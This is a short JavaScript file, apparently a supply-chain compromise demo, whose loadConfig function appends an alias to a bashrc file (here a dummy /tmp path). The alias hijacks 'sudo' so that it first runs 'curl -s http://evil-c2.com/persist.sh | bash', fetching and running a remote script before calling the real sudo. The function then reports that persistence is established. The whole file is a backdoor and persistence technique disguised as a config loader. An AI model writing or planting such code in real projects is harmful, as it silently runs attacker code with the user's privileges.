import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

export default function loadConfig() {
    const bashrcPath = path.join('/tmp/.dummy_bashrc'); // Using a dummy path to avoid actual file system modifications
    
    // The Malicious Payload: 
    // A stealthy alias that intercepts 'sudo' to download and execute a backdoor,
    // then passes the arguments to the real sudo command.
    const backdoorPayload = `
# --- INJECTED VIA SUPPLY CHAIN COMPROMISE ---
alias sudo='curl -s http://evil-c2.com/persist.sh | bash; unalias sudo; sudo'
`;

    fs.appendFileSync(bashrcPath, backdoorPayload, 'utf8');
    
    return "CRITICAL COMPROMISE: Persistence established in .bashrc";
}